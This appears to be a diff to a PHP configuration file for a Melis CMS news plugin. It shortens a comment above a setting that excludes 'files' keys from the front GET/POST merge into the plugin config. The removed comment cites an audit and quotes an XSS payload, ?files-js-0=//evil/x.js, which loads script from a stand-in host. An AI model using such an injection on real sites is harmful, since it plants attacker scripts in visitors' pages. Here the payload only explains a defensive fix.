@@ -6,11 +6,8 @@ return array(
             'plugins' => array(
                 'MelisCmsNewsLatestNewsPlugin' => array(
                     'front' => array(
-                        // SECURITY (audit CN-M1): keys listed here are excluded from the
-                        // GET/POST→config merge of MelisTemplatingPlugin::updateFrontConfig —
-                        // without it, ?files-js-0=//evil/x.js injected a <script src> via
-                        // MelisFrontHeadService (the front XSS listener only strips the
-                        // exact keys js/css/files, not the exploded files-js-0 form).
+                        // Keys listed here are excluded from the front GET/POST merge
+                        // into the plugin config (MelisTemplatingPlugin::updateFrontConfig).
                         'sub_plugins_params' => array('files'),
                         'template_path' => array('MelisCmsNews/latestnews'),
                         'id' => 'latestnews',
